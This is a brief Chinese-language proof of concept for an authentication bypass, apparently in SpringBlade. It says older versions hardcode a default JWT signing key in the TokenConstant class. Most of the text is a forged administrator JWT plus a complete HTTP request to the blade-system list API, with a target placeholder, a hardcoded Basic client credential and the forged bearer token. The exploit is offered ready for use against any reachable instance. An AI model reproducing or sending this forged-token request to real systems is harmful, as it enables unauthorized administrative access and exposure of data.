## 审计

低版本存在jwt密钥为硬编码，下载源码进行代码审计

在org.springblade.core.launch.constant.TokenConstant接口处发现83位默认jwt密钥

![image-20241210091644743](./image/image-20241210091644743.png)

## 利用

伪造token：

```
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIn0.JOsWrAkblh7PFJFrr_cmuOQMrzStfwvee61sSVH4o6p401oAHpP284VkL0CyKnUX1MT8KnrCAOPRYBRbmfcdTg
```



```http
GET /api/blade-system/api/list?size=100&current=1 HTTP/1.1
Host: {target}
Connection: keep-alive
Authorization: Basic c2FiZXI6c2FiZXJfc2VjcmV0
blade-auth: bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIn0.JOsWrAkblh7PFJFrr_cmuOQMrzStfwvee61sSVH4o6p401oAHpP284VkL0CyKnUX1MT8KnrCAOPRYBRbmfcdTg
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; rv:11.0) like Gecko
Accept: application/json, text/plain, */*
User-Type: web_account
Tenant-Id: 000000
Accept-Encoding: gzip, deflate, br, zstd


```

